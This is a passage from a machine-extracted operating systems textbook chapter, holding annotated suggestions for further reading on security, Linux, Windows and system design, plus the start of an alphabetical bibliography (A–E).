this\r\narticle.\nSEC. 13.1 SUGGESTIONS FOR FURTHER READING 1039\r\nMilojicic, ‘‘Security and Privacy’’\r\nSecurity has many facets, including operating systems, networks, implications\r\nfor privacy, and more. In this article, six security experts are interviewed on their\r\nthoughts on the subject.\r\nNachenberg, ‘‘Computer Virus-Antivirus Coevolution’’\r\nAs soon as the antivirus developers find a way to detect and neutralize some\r\nclass of computer virus, the virus writers go them one better and improve the virus.\r\nThe cat-and-mouse game played by the virus and antivirus sides is discussed here.\r\nThe author is not optimistic about the antivirus writers winning the war, which is\r\nbad news for computer users.\r\nSasse, ‘‘Red-Eye Blink, Bendy Shuffle, and the Yuck Factor: A User Experience of\r\nBiometric Airport Systems’’\r\nThe author discusses his experiences with the iris recognition system used at a\r\nnumber of large airports. Not all of them are positive.\r\nThibadeau, ‘‘Trusted Computing for Disk Drives and Other Peripherals’’\r\nIf you thought a disk drive was just a place where bits are stored, think again.\r\nA modern disk drive has a powerful CPU, megabytes of RAM, multiple communi\u0002cation channels, and even its own boot ROM. In short, it is a complete computer\r\nsystem ripe for attack and in need of its own protection system. This paper dis\u0002cusses securing the disk drive."
          },
          "13.1.10 Case Study 1: UNIX, Linux, and Android": {
            "page": 1070,
            "content": "13.1.10 Case Study 1: UNIX, Linux, and Android\r\nBovet and Cesati, Understanding the Linux Kernel\r\nThis book is probably the best overall discussion of the Linux kernel. It covers\r\nprocesses, memory management, file systems, signals, and much more.\r\nIEEE, ‘‘Information Technology—Portable Operating System Interface (POSIX),\r\nPart 1: System Application Program Interface (API) [C Language]’’\r\nThis is the standard. Some parts are actually quite readable, especially Annex\r\nB, ‘‘Rationale and Notes,’’ which often sheds light on why things are done as they\r\nare. One advantage of referring to the standards document is that, by definition,\r\nthere are no errors. If a typographical error in a macro name makes it through the\r\nediting process it is no longer an error, it is off icial.\r\nFusco, The Linux Programmer’s Toolbox\r\nThis book describes how to use Linux for the intermediate user, one who\r\nknows the basics and wants to start exploring how the many Linux programs work.\r\nIt is intended for C programmers.\n1040 READING LIST AND BIBLIOGRAPHY CHAP. 13\r\nMaxwell, Linux Core Kernel Commentary\r\nThe first 400 pages of this book contain a subset of the Linux kernel code. The\r\nlast 150 pages consist of comments on the code, very much in the style of John\r\nLions’ classic book. If you want to understand the Linux kernel in all its gory\r\ndetail, this is the place to begin, but be warned: reading 40,000 lines of C is not for\r\nev eryone."
          },
          "13.1.11 Case Study 2: Windows 8": {
            "page": 1071,
            "content": "13.1.11 Case Study 2: Windows 8\r\nCusumano and Selby, ‘‘How Microsoft Builds Software’’\r\nHave you ever wondered how anyone could write a 29-million-line program\r\n(like Windows 2000) and have it work at all? To find out how Microsoft’s build\u0002and-test cycle is used to manage very large software projects, take a look at this\r\npaper. The procedure is quite instructive.\r\nRector and Newcomer, Win32 Programming\r\nIf you are looking for one of those 1500-page books giving a summary of how\r\nto write Windows programs, this is not a bad start. It covers windows, devices,\r\ngraphical output, keyboard and mouse input, printing, memory management,\r\nlibraries, and synchronization, among many other topics. It requires knowledge of\r\nC or C++.\r\nRussinovich and Solomon, Windows Internals, Part 1\r\nIf you want to learn how to use Windows, there are hundreds of books out\r\nthere. If you want to know how Windows works inside, this is your best bet. It\r\ncovers numerous internal algorithms and data structures, and in considerable tech\u0002nical detail. No other book comes close."
          },
          "13.1.12 Operating System Design": {
            "page": 1071,
            "content": "13.1.12 Operating System Design\r\nSaltzer and Kaashoek, Principles of Computer System Design: An Introduction\r\nThis books looks at computer systems in general, rather than operating systems\r\nper se, but the principles they identify apply very much to operating systems also.\r\nWhat is interesting about this work is that it carefully identifies ‘‘the ideas that\r\nworked,’’ such as names, file systems, read-write coherence, authenticated and\r\nconfidential messages, etc. Principles that, in our opinion, all computer scientists in\r\nthe world should recite every day, before going to work.\r\nBrooks, The Mythical Man Month: Essays on Software Engineering\r\nFred Brooks was one of the designers of IBM’s OS/360. He learned the hard\r\nway what works and what does not work. The advice given in this witty, amusing,\r\nand informative book is as valid now as it was a quarter of a century ago when he\r\nfirst wrote it down.\nSEC. 13.1 SUGGESTIONS FOR FURTHER READING 1041\r\nCooke et al., ‘‘UNIX and Beyond: An Interview with Ken Thompson’’\r\nDesigning an operating system is much more of an art than a science. Conse\u0002quently, listening to experts in the field is a good way to learn about the subject.\r\nThey do not come much more expert than Ken Thompson, co-designer of UNIX,\r\nInferno, and Plan 9. In this wide-ranging interview, Thompson gives his thoughts\r\non where we came from and where we are going in the field.\r\nCorbato´, ‘‘On Building Systems That Will Fail’’\r\nIn his Turing Award lecture, the father of timesharing addresses many of the\r\nsame concerns that Brooks does in The Mythical Man-Month. His conclusion is\r\nthat all complex systems will ultimately fail, and that to have any chance for suc\u0002cess at all, it is absolutely essential to avoid complexity and strive for simplicity\r\nand elegance in design.\r\nCrowley, Operating Systems: A Design-Oriented Approach\r\nMost textbooks on operating systems just describe the basic concepts (pro\u0002cesses, virtual memory, etc.) and give a few examples, but say nothing about how\r\nto design an operating system. This one is unique in devoting four chapters to the\r\nsubject.\r\nLampson, ‘‘Hints for Computer System Design’’\r\nButler Lampson, one of the world’s leading designers of innovative operating\r\nsystems, has collected many hints, suggestions, and guidelines from his years of\r\nexperience and put them together in this entertaining and informative article. Like\r\nBrooks’ book, this is required reading for every aspiring operating system designer.\r\nWirth, ‘‘A Plea for Lean Software’’\r\nNiklaus Wirth, a famous and experienced system designer, makes the case here\r\nfor lean and mean software based on a few simple concepts, instead of the bloated\r\nmess that much commercial software is. He makes his point by discussing his\r\nOberon system, a network-oriented, GUI-based operating system that fits in 200\r\nKB, including the Oberon compiler and text editor."
          }
        }
      },
      "13.2 ALPHABETICAL BIBLIOGRAPHY": {
        "page": 1072,
        "content": "13.2 ALPHABETICAL BIBLIOGRAPHY\r\nABDEL-HAMID, T., and MADNICK, S.: Software Project Dynamics: An Integrated\r\nApproach, Upper Saddle River, NJ: Prentice Hall, 1991.\r\nACCETTA, M., BARON, R., GOLUB, D., RASHID, R., TEVANIAN, A., and YOUNG, M.:\r\n‘‘Mach: A New Kernel Foundation for UNIX Development,’’ Proc. USENIX Summer\r\nConf., USENIX, pp. 93–112, 1986.\n1042 READING LIST AND BIBLIOGRAPHY CHAP. 13\r\nADAMS, G.B. III, AGRAWAL, D.P., and SIEGEL, H.J.: ‘‘ A Survey and Comparison of Fault\u0002Tolerant Multistage Interconnection Networks,’’ Computer, vol. 20, pp. 14–27, June\r\n1987.\r\nADAMS, K., and AGESEN, O.: ‘‘ A Comparison of Software and Hardware Technqiues for\r\nX86 Virtualization,’’ Proc. 12th Int’l Conf. on Arc h. Support for Prog. Lang. and Oper\u0002ating Systems, ACM, pp. 2–13, 2006.\r\nAGESEN, O., MATTSON, J., RUGINA, R., and SHELDON, J.: ‘‘Software Techniques for\r\nAv oiding Hardware Virtualization Exits,’’ Proc. USENIX Ann. Tech. Conf., USENIX,\r\n2012.\r\nAHMAD, I.: ‘‘Gigantic Clusters: Where Are They and What Are They Doing?’’ IEEE Con\u0002currency, vol. 8, pp. 83–85, April-June 2000.\r\nAHN, B.-S., SOHN, S.-H., KIM, S.-Y., CHA, G.-I., BAEK, Y.-C., JUNG, S.-I., and KIM, M.-J.:\r\n‘‘Implementation and Evaluation of EXT3NS Multimedia File System,’’ Proc. 12th\r\nAnn. Int’l Conf. on Multimedia, ACM, pp. 588–595, 2004.\r\nALBATH, J., THAKUR, M., and MADRIA, S.: ‘‘Energy Constraint Clustering Algorithms\r\nfor Wireless Sensor Networks,’’ J. Ad Hoc Networks, vol. 11, pp. 2512–2525, Nov.\r\n2013.\r\nAMSDEN, Z., ARAI, D., HECHT, D., HOLLER, A., and SUBRAHMANYAM, P.: ‘‘VMI: An\r\nInterface for Paravirtualization,’’ Proc. 2006 Linux Symp., 2006.\r\nANDERSON, D.: SATA Storage Technology: Serial ATA, Mindshare, 2007.\r\nANDERSON, R.: Security Engineering, 2nd ed., Hoboken, NJ: John Wiley & Sons, 2008.\r\nANDERSON, T.E.: ‘‘The Performance of Spin Lock Alternatives for Shared-Memory Multi\u0002processors,’’ IEEE Trans. on Parallel and Distr. Systems, vol. 1, pp. 6–16, Jan. 1990.\r\nANDERSON, T.E., BERSHAD, B.N., LAZOWSKA, E.D., and LEVY, H.M.: ‘‘Scheduler Acti\u0002vations: Effective Kernel Support for the User-Level Management of Parallelism,’’\r\nACM Trans. on Computer Systems, vol. 10, pp. 53–79, Feb. 1992.\r\nANDREWS, G.R.: Concurrent Programming—Principles and Practice, Redwood City, CA:\r\nBenjamin/Cummings, 1991.\r\nANDREWS, G.R., and SCHNEIDER, F.B.: ‘‘Concepts and Notations for Concurrent Pro\u0002gramming,’’ Computing Surveys, vol. 15, pp. 3–43, March 1983.\r\nAPPUSWAMY, R., VAN MOOLENBROEK, D.C., and TANENBAUM, A.S.: ‘‘Flexible, Modu\u0002lar File Volume Virtualization in Loris,’’ Proc. 27th Symp. on Mass Storage Systems\r\nand Tech., IEEE, pp. 1–14, 2011.\r\nARNAB, A., and HUTCHISON, A.: ‘‘Piracy and Content Protection in the Broadband Age,’’\r\nProc. S. African Telecomm. Netw. and Appl. Conf, 2006.\r\nARON, M., and DRUSCHEL, P.: ‘‘Soft Timers: Efficient Microsecond Software Timer Sup\u0002port for Network Processing,’’ Proc. 17th Symp. on Operating Systems Principles,\r\nACM, pp. 223–246, 1999.\r\nARPACI-DUSSEAU, R. and ARPACI-DUSSEAU, A.: Operating Systems: Three Easy Pieces,\r\nMadison, WI: Arpacci-Dusseau, 2013.\nSEC. 13.2 ALPHABETICAL BIBLIOGRAPHY 1043\r\nBAKER, F.T.: ‘‘Chief Programmer Team Management of Production Programming,’’ IBM\r\nSystems J., vol. 11, pp. 1, 1972.\r\nBAKER, M., SHAH, M., ROSENTHAL, D.S.H., ROUSSOPOULOS, M., MANIATIS, P.,\r\nGIULI, T.J., and BUNGALE, P.: ‘‘ A Fresh Look at the Reliability of Long-Term Digital\r\nStorage,’’ Proc. First European Conf. on Computer Systems (EUROSYS), ACM, pp.\r\n221–234, 2006.\r\nBALA, K., KAASHOEK, M.F., and WEIHL, W.: ‘‘Software Prefetching and Caching for\r\nTranslation Lookaside Buffers,’’ Proc. First Symp. on Operating Systems Design and\r\nImplementation, USENIX, pp. 243–254, 1994.\r\nBARHAM, P., DRAGOVIC, B., FRASER, K., HAND, S., HARRIS, T., HO, A., NEUGE\u0002BAUER, R., PRATT, I., and WARFIELD, A.: ‘‘Xen and the Art of Virtualization,’’ Proc.\r\n19th Symp. on Operating Systems Principles, ACM, pp. 164–177, 2003.\r\nBARNI, M.: ‘‘Processing Encrypted Signals: A New Frontier for Multimedia Security,’’\r\nProc. Eighth Workshop on Multimedia and Security, ACM, pp. 1–10, 2006.\r\nBARR, K., BUNGALE, P., DEASY, S., GYURIS, V., HUNG, P., NEWELL, C., TUCH, H., and\r\nZOPPIS, B.: ‘‘The VMware Mobile Virtualization Platform: Is That a Hypervisor in\r\nYour Pocket?’’ ACM SIGOPS Operating Systems Rev., vol. 44, pp. 124–135, Dec.\r\n2010.\r\nBARWINSKI, M., IRVINE, C., and LEVIN, T.: ‘‘Empirical Study of Drive-By-Download\r\nSpyware,’’ Proc. Int’l Conf. on I-Warfare and Security, Academic Confs. Int’l, 2006.\r\nBASILLI, V.R., and PERRICONE, B.T.: ‘‘Software Errors and Complexity: An Empirical\r\nStudy,’’ Commun. of the ACM, vol. 27, pp. 42–52, Jan. 1984.\r\nBAUMANN, A., BARHAM, P., DAGAND, P., HARRIS, T., ISAACS, R., PETER, S., ROSCOE,\r\nT., SCHUPBACH, A., and SINGHANIA, A.: ‘‘The Multikernel: A New OS Architecture\r\nfor Scalable Multicore Systems,’’ Proc. 22nd Symp. on Operating Systems Principles,\r\nACM, pp. 29–44, 2009.\r\nBAYS, C.: ‘‘ A Comparison of Next-Fit, First-Fit, and Best-Fit,’’ Commun. of the ACM, vol.\r\n20, pp. 191–192, March 1977.\r\nBEHAM, M., VLAD, M., and REISER, H.: ‘‘Intrusion Detection and Honeypots in Nested\r\nVirtualization Environments,’’ Proc. 43rd Conf. on Dependable Systems and Networks,\r\nIEEE, pp. 1–6, 2013.\r\nBELAY, A., BITTAU, A., MASHTIZADEH, A., TEREI, D., MAZIERES, D., and\r\nKOZYRAKIS, C.: ‘‘Dune: Safe User-level Access to Privileged CPU Features,’’ Proc.\r\nNinth Symp. on Operating Systems Design and Implementation, USENIX, pp.\r\n335–348, 2010.\r\nBELL, D., and LA PADULA, L.: ‘‘Secure Computer Systems: Mathematical Foundations\r\nand Model,’’ Technical Report MTR 2547 v2, Mitre Corp., Nov. 1973.\r\nBEN-ARI, M.: Principles of Concurrent and Distributed Programming, Upper Saddle\r\nRiver, NJ: Prentice Hall, 2006.\r\nBEN-YEHUDA, M., D. DAY , M., DUBITZKY, Z., FACTOR, M., HAR’EL, N., GORDON, A.,\r\nLIGUORI, A., WASSERMAN, O., and YASSOUR, B.: ‘‘The Turtles Project: Design and\r\nImplementation of Nested Virtualization,’’ Proc. Ninth Symp. on Operating Systems\r\nDesign and Implementation, USENIX, Art. 1–6, 2010.\n1044 READING LIST AND BIBLIOGRAPHY CHAP. 13\r\nBHEDA, R.A., BEU, J.G., RAILING, B.P., and CONTE, T.M.: ‘‘Extrapolation Pitfalls When\r\nEvaluating Limited Endurance Memory,’’ Proc. 20th Int’l Symp. on Modeling, Analy\u0002sis, & Simulation of Computer and Telecomm. Systems, IEEE, pp. 261–268, 2012.\r\nBHEDA, R.A., POOVEY, J.A., BEU, J.G., and CONTE, T.M.: ‘‘Energy Efficient Phase\r\nChange Memory Based Main Memory for Future High Performance Systems,’’ Proc.\r\nInt’l Green Computing Conf., IEEE, pp. 1–8, 2011.\r\nBHOEDJANG, R.A.F., RUHL, T., and BAL, H.E.: ‘‘User-Level Network Interface Proto\u0002cols,’’ Computer, vol. 31, pp. 53–60, Nov. 1998.\r\nBIBA, K.: ‘‘Integrity Considerations for Secure Computer Systems,’’ Technical Report\r\n76–371, U.S. Air Force Electronic Systems Division, 1977.\r\nBIRRELL, A.D., and NELSON, B.J.: ‘‘Implementing Remote Procedure Calls,’’ ACM Trans.\r\non Computer Systems, vol. 2, pp. 39–59, Feb. 1984.\r\nBISHOP, M., and FRINCKE, D.A.: ‘‘Who Owns Your Computer?’’ IEEE Security and Pri\u0002vacy, vol. 4, pp. 61–63, 2006.\r\nBLACKHAM, B, SHI, Y. and HEISER, G.: ‘‘Improving Interrupt Response Time in a Verifi\u0002able Protected Microkernel,’’ Proc. Seventh European Conf. on Computer Systems\r\n(EUROSYS), April, 2012.\r\nBOEHM, B.: Software Engineering Economics, Upper Saddle River, NJ: Prentice Hall,\r\n1981.\r\nBOGDANOV, A., AND LEE, C.H.: ‘‘Limits of Provable Security for Homomorphic Encryp\u0002tion,’’ Proc. 33rd Int’l Cryptology Conf., Springer, 2013.\r\nBORN, G: Inside the Windows 98 Registry, Redmond, WA: Microsoft Press, 1998.\r\nBOTELHO, F.C., SHILANE, P., GARG, N., and HSU, W.: ‘‘Memory Efficient Sanitization of\r\na Deduplicated Storage System,’’ Proc. 11th USENIX Conf. on File and Storage Tech.,\r\nUSENIX, pp. 81–94, 2013.\r\nBOTERO, J. F., and HESSELBACH, X.: ‘‘Greener Networking in a Network Virtualization\r\nEnvironment,’’ Computer Networks, vol. 57, pp. 2021–2039, June 2013.\r\nBOULGOURIS, N.V., PLATANIOTIS, K.N., and MICHELI-TZANAKOU, E.: Biometics: The\u0002ory Methods, and Applications, Hoboken, NJ: John Wiley & Sons, 2010.\r\nBOVET, D.P., and CESATI, M.: Understanding the Linux Kernel, Sebastopol, CA: O’Reilly\r\n& Associates, 2005.\r\nBOYD-WICKIZER, S., CHEN, H., CHEN, R., MAO, Y., KAASHOEK, F., MORRIS, R.,\r\nPESTEREV, A., STEIN, L., WU, M., DAI, Y., ZHANG, Y., and ZHANG, Z.: ‘‘Corey: an\r\nOperating System for Many Cores,’’ Proc. Eighth Symp. on Operating Systems Design\r\nand Implementation, USENIX, pp. 43–57, 2008.\r\nBOYD-WICKIZER, S., CLEMENTS A.T., MAO, Y., PESTEREV, A., KAASHOEK, F.M.,\r\nMORRIS, R., and ZELDOVICH, N.: ‘‘ An Analysis of Linux Scalability to Many\r\nCores,’’ Proc. Ninth Symp. on Operating Systems Design and Implementation,\r\nUSENIX, 2010.\r\nBRATUS, S.: ‘‘What Hackers Learn That the Rest of Us Don’t: Notes on Hacker Curricu\u0002lum,’’ IEEE Security and Privacy, vol. 5, pp. 72–75, July/Aug. 2007.\nSEC. 13.2 ALPHABETICAL BIBLIOGRAPHY 1045\r\nBRATUS, S., LOCASTO, M.E., PATTERSON, M., SASSAMAN, L., SHUBINA, A.: ‘‘From\r\nBuffer Overflows to Weird Machines and Theory of Computation,’’ ;Login:, USENIX,\r\npp. 11–21, December 2011.\r\nBRINCH HANSEN, P.: ‘‘The Programming Language Concurrent Pascal,’’ IEEE Trans. on\r\nSoftware Engineering, vol. SE-1, pp. 199–207, June 1975.\r\nBROOKS, F.P., Jr.: ‘‘No Silver Bullet—Essence and Accident in Software Engineering,’’\r\nComputer, vol. 20, pp. 10–19, April 1987.\r\nBROOKS, F.P., Jr.: The Mythical Man-Month: Essays on Software Engineering, 20th\r\nAnniversary Edition, Boston: Addison-Wesley, 1995.\r\nBRUSCHI, D., MARTIGNONI, L., and MONGA, M.: ‘‘Code Normalization for Self-Mutat\u0002ing Malware,’’ IEEE Security and Privacy, vol. 5, pp. 46–54, March/April 2007.\r\nBUGNION, E., DEVINE, S., GOVIL, K., and ROSENBLUM, M.: ‘‘Disco: Running Commod\u0002ity Operating Systems on Scalable Multiprocessors,’’ ACM Trans. on Computer Sys\u0002tems, vol. 15, pp. 412–447, Nov. 1997.\r\nBUGNION, E., DEVINE, S., ROSENBLUM, M., SUGERMAN, J., and WANG, E.: ‘‘Bringing\r\nVirtualization to the x86 Architecture with the Original VMware Workstation,’’ ACM\r\nTr ans. on Computer Systems, vol. 30, number 4, pp.12:1–12:51, Nov. 2012.\r\nBULPIN, J.R., and PRATT, I.A.: ‘‘Hyperthreading-Aware Process Scheduling Heuristics,’’\r\nProc. USENIX Ann. Tech. Conf., USENIX, pp. 399–403, 2005.\r\nCAI, J., and STRAZDINS, P.E.: ‘‘ An Accurate Prefetch Technique for Dynamic Paging\r\nBehaviour for Software Distributed Shared Memory,’’ Proc. 41st Int’l Conf. on Paral\u0002lel Processing, IEEE., pp. 209–218, 2012.\r\nCAI, Y., and CHAN, W.K.: ‘‘MagicFuzzer: Scalable Deadlock Detection for Large-scale\r\nApplications,’’ Proc. 2012 Int’l Conf. on Software Engineering, IEEE, pp. 606–616,\r\n2012.\r\nCAMPISI, P.: Security and Privacy in Biometrics, New York: Springer, 2013.\r\nCARPENTER, M., LISTON, T., and SKOUDIS, E.: ‘‘Hiding Virtualization from Attackers\r\nand Malware,’’ IEEE Security and Privacy, vol. 5, pp. 62–65, May/June 2007.\r\nCARR, R.W., and HENNESSY, J.L.: ‘‘WSClock—A Simple and Effective Algorithm for\r\nVirtual Memory Management,’’ Proc. Eighth Symp. on Operating Systems Principles,\r\nACM, pp. 87–95, 1981.\r\nCARRIERO, N., and GELERNTER, D.: ‘‘The S/Net’s Linda Kernel,’’ ACM Trans. on Com\u0002puter Systems, vol. 4, pp. 110–129, May 1986.\r\nCARRIERO, N., and GELERNTER, D.: ‘‘Linda in Context,’’ Commun. of the ACM, vol. 32,\r\npp. 444–458, April 1989.\r\nCERF, C., and NAV ASKY, V.: The Experts Speak, New York: Random House, 1984.\r\nCHEN, M.-S., YANG, B.-Y., and CHENG, C.-M.: ‘‘RAIDq: A Software-Friendly, Multiple\u0002Parity RAID,’’ Proc. Fifth Workshop on Hot Topics in File and Storage Systems,\r\nUSENIX, 2013.\n1046 READING LIST AND BIBLIOGRAPHY CHAP. 13\r\nCHEN, Z., XIAO, N., and LIU, F.: ‘‘SAC: Rethinking the Cache Replacement Policy for\r\nSSD-Based Storage Systems,’’ Proc. Fifth Int’l Systems and Storage Conf., ACM, Art.\r\n13, 2012.\r\nCHERVENAK, A., VELLANKI, V., and KURMAS, Z.: ‘‘Protecting File Systems: A Survey\r\nof Backup Techniques,’’ Proc. 15th IEEE Symp. on Mass Storage Systems, IEEE,\r\n1998.\r\nCHIDAMBARAM, V., PILLAI, T.S., ARPACI-DUSSEAU, A.C., and ARPACI-DUSSEAU,\r\nR.H.: ‘‘Optimistic Crash Consistency,’’ Proc. 24th Symp. on Operating System Princi\u0002ples, ACM, pp. 228–243, 2013.\r\nCHOI, S., and JUNG, S.: ‘‘ A Locality-Aware Home Migration for Software Distributed\r\nShared Memory,’’ Proc. 2013 Conf. on Research in Adaptive and Convergent Systems,\r\nACM, pp. 79–81, 2013.\r\nCHOW, T.C.K., and ABRAHAM, J.A.: ‘‘Load Balancing in Distributed Systems,’’ IEEE\r\nTr ans. on Software Engineering, vol. SE-8, pp. 401–412, July 1982.\r\nCLEMENTS, A.T, KAASHOEK, M.F., ZELDOVICH, N., MORRIS, R.T., and KOHLER, E.:\r\n‘‘The Scalable Commutativity Rule: Designing Scalable Software for Multicore Pro\u0002cessors,’’ Proc. 24th Symp. on Operating Systems Principles, ACM, pp. 1–17, 2013.\r\nCOFFMAN, E.G., ELPHICK, M.J., and SHOSHANI, A.: ‘‘System Deadlocks,’’ Computing\r\nSurveys, vol. 3, pp. 67–78, June 1971.\r\nCOLP, P., NANAV ATI, M., ZHU, J., AIELLO, W., COKER, G., DEEGAN, T., LOSCOCCO, P.,\r\nand WARFIELD, A.: ‘‘Breaking Up Is Hard to Do: Security and Functionality in a\r\nCommodity Hypervisor,’’ Proc. 23rd Symp. of Operating Systems Principles, ACM,\r\npp. 189–202, 2011.\r\nCOOKE, D., URBAN, J., and HAMILTON, S.: ‘‘UNIX and Beyond: An Interview with Ken\r\nThompson,’’ Computer, vol. 32, pp. 58–64, May 1999.\r\nCOOPERSTEIN, J.: Writing Linux Device Drivers: A Guide with Exercises, Seattle: Cre\u0002ateSpace, 2009.\r\nCORBAT O, F.J.: ‘‘On Building Systems That Will Fail,’’ Commun. of the ACM, vol. 34, pp.\r\n72–81, June 1991.\r\nCORBAT O, F.J., MERWIN-DAGGETT, M., and DALEY, R.C.: ‘‘ An Experimental Time\u0002Sharing System,’’ Proc. AFIPS Fall Joint Computer Conf., AFIPS, pp. 335–344, 1962.\r\nCORBAT O, F.J., and VYSSOTSKY, V.A.: ‘‘Introduction and Overview of the MULTICS\r\nSystem,’’ Proc. AFIPS Fall Joint Computer Conf., AFIPS, pp. 185–196, 1965.\r\nCORBET, J., RUBINI, A., and KROAH-HARTMAN, G.: Linux Device Drivers, Sebastopol,\r\nCA: O’Reilly & Associates, 2009.\r\nCORNWELL, M.: ‘‘ Anatomy of a Solid-State Drive,‘‘ ACM Queue 10 10, pp. 30–37, 2012.\r\nCORREIA, M., GOMEZ FERRO, D., JUNQUEIRA, F.P., and SERAFINI, M.: ‘‘Practical\r\nHardening of Crash-Tolerant Systems,’’ Proc. USENIX Ann. Tech. Conf., USENIX,\r\n2012.\r\nCOURTOIS, P.J., HEYMANS, F., and PARNAS, D.L.: ‘‘Concurrent Control with Readers and\r\nWriters,’’ Commun. of the ACM, vol. 10, pp. 667–668, Oct. 1971.\nSEC. 13.2 ALPHABETICAL BIBLIOGRAPHY 1047\r\nCROWLEY, C.: Operating Systems: A Design-Oriented Approach, Chicago: Irwin, 1997.\r\nCUSUMANO, M.A., and SELBY, R.W.: ‘‘How Microsoft Builds Software,’’ Commun. of the\r\nACM, vol. 40, pp. 53–61, June 1997.\r\nDABEK, F., KAASHOEK, M.F., KARGET, D., MORRIS, R., and STOICA, I.: ‘‘Wide-Area\r\nCooperative Storage with CFS,’’ Proc. 18th Symp. on Operating Systems Principles,\r\nACM, pp. 202–215, 2001.\r\nDAI, Y., QI, Y., REN, J., SHI, Y., WANG, X., and YU, X.: ‘‘ A Lightweight VMM on Many\r\nCore for High Performance Computing,’’ Proc. Ninth Int’l Conf. on Virtual Execution\r\nEnvironments, ACM, pp. 111–120, 2013.\r\nDALEY, R.C., and DENNIS, J.B.: ‘‘Virtual Memory, Process, and Sharing in MULTICS,’’\r\nCommun. of the ACM, vol. 11, pp. 306–312, May 1968.\r\nDASHTI, M., FEDOROVA, A., FUNSTON, J., GAUD, F., LACHAIZE, R., LEPERS, B.,\r\nQUEMA, V., and ROTH, M.: ‘‘Traffic Management: A Holistic Approach to Memory\r\nPlacement on NUMA Systems,’’ Proc. 18th Int’l Conf. on Arc h. Support for Prog.\r\nLang. and Operating Systems, ACM, pp. 381–394, 2013.\r\nDAUGMAN, J.: ‘‘How Iris Recognition Works,’’ IEEE Trans. on Circuits and Systems for\r\nVideo Tech., vol. 14, pp. 21–30, Jan. 2004.\r\nDAWSON-HAGGERTY, S., KRIOUKOV, A., TANEJA, J., KARANDIKAR, S., FIERRO, G.,\r\nand CULLER, D: ‘‘BOSS: Building Operating System Services,’’ Proc. 10th Symp. on\r\nNetworked Systems Design and Implementation, USENIX, pp. 443–457, 2013.\r\nDAYAN, N., SVENDSEN, M.K., BJORING, M., BONNET, P., and BOUGANIM, L.: ‘‘Eagle\u0002Tree: Exploring the Design Space of SSD-based Algorithms,’’ Proc. VLDB Endow\u0002ment, vol. 6, pp. 1290–1293, Aug. 2013.\r\nDE BRUIJN, W., BOS, H., and BAL, H.: ‘‘ Application-Tailored I/O with Streamline,’’ ACM\r\nTr ans. on Computer Syst., vol. 29, number 2, pp.1–33, May 2011.\r\nDE BRUIJN, W., and BOS, H.: ‘‘Beltway Buffers: Avoiding the OS Traffic Jam,’’ Proc. 27th\r\nInt’l Conf. on Computer Commun., April 2008.\r\nDENNING, P.J.: ‘‘The Working Set Model for Program Behavior,’’ Commun. of the ACM,\r\nvol. 11, pp. 323–333, 1968a.\r\nDENNING, P.J.: ‘‘Thrashing: Its Causes and Prevention,’’ Proc. AFIPS National Computer\r\nConf., AFIPS, pp. 915–922, 1968b.\r\nDENNING, P.J.: ‘‘Virtual Memory,’’ Computing Surveys, vol. 2, pp. 153–189, Sept. 1970.\r\nDENNING, D.: Information Warfare and Security, Boston: Addison-Wesley, 1999.\r\nDENNING, P.J.: ‘‘Working Sets Past and Present,’’ IEEE Trans. on Software Engineering,\r\nvol. SE-6, pp. 64–84, Jan. 1980.\r\nDENNIS, J.B., and VAN HORN, E.C.: ‘‘Programming Semantics for Multiprogrammed\r\nComputations,’’ Commun. of the ACM, vol. 9, pp. 143–155, March 1966.\r\nDIFFIE, W., and HELLMAN, M.E.: ‘‘New Directions in Cryptography,’’ IEEE Trans. on\r\nInformation Theory, vol. IT-22, pp. 644–654, Nov. 1976.\n1048 READING LIST AND BIBLIOGRAPHY CHAP. 13\r\nDIJKSTRA, E.W.: ‘‘Co-operating Sequential Processes,’’ in Programming Languages,\r\nGenuys, F. (Ed.), London: Academic Press, 1965.\r\nDIJKSTRA, E.W.: ‘‘The Structure of THE Multiprogramming System,’’ Commun. of the\r\nACM, vol. 11, pp. 341–346, May 1968.\r\nDUBOIS, M., SCHEURICH, C., and BRIGGS, F.A.: ‘‘Synchronization, Coherence, and\r\nEvent Ordering in Multiprocessors,’’ Computer, vol. 21, pp. 9–21, Feb. 1988.\r\nDUNN, A., LEE, M.Z., JANA, S., KIM, S., SILBERSTEIN, M., XU, Y., SHMATIKOV, V., and\r\nWITCHEL, E.: ‘‘Eternal Sunshine of the Spotless Machine: Protecting Privacy with\r\nEphemeral Channels,’’ Proc. 10th Symp. on Operating Systems Design and Implemen\u0002tation, USENIX, pp. 61–75, 2012.\r\nDUTTA, K., SINGH, V.K., and VANDERMEER, D.: ‘‘Estimating Operating System Process\r\nEnergy Consumption in Real Time,’’ Proc. Eighth Int’l Conf. on Design Science at the\r\nIntersection of Physical and Virtual Design, Springer-Verlag, pp. 400–404, 2013.\r\nEAGER, D.L., LAZOWSKA, E.D., and ZAHORJAN, J.: ‘‘ Adaptive Load Sharing in Homo\u0002geneous Distributed Systems,’’ IEEE Trans. on Software Engineering, vol. SE-12, pp.\r\n662–675, May 1986.\r\nEDLER, J., LIPKIS, J., and SCHONBERG, E.: ‘‘Process Management for Highly Parallel\r\nUNIX Systems,’’ Proc. USENIX Workshop on UNIX and Supercomputers, USENIX,\r\npp. 1–17, Sept. 1988.\r\nEL FERKOUSS, O., SNAIKI, I., MOUNAOUAR, O., DAHMOUNI, H., BEN ALI, R.,\r\nLEMIEUX, Y., and OMAR, C.: ‘‘ A 100Gig Network Processor Platform for Openflow,’’\r\nProc. Seventh Int’l Conf. on Network Services and Management, IFIP, pp. 286–289,\r\n2011.\r\nEL GAMAL, A.: ‘‘ A Public Key Cryptosystem and Signature Scheme Based on Discrete\r\nLogarithms,’’ IEEE Trans. on Information Theory, vol. IT-31, pp. 469–472, July 1985.\r\nELNABLY., A., and WANG, H.: ‘‘Efficient QoS for Multi-Tiered Storage Systems,’’ Proc.\r\nFourth USENIX Workshop on Hot Topics in Storage and File Systems, USENIX, 2012.\r\nELPHINSTONE, K., KLEIN, G., DERRIN, P., ROSCOE, T., and HEISER, G.: ‘‘To wards a\r\nPractical, Verified, Kernel,’’ Proc. 11th Workshop on Hot Topics in Operating Systems,\r\nUSENIX, pp. 117–122, 2007.\r\nENGLER, D.R., CHELF, B., CHOU, A., and HALLEM, S.: ‘‘Checking System Rules Using\r\nSystem-Specific Programmer-Written Compiler Extensions,’’ Proc. Fourth Symp. on\r\nOperating Systems Design and Implementation, USENIX, pp. 1–16, 2000.\r\nENGLER, D.R., KAASHOEK, M.F., and O’TOOLE, J. Jr.: ‘‘Exokernel: An Operating Sys\u0002tem Architecture for Application-Level Resource Management,’’ Proc. 15th Symp. on\r\nOperating Systems Principles, ACM, pp. 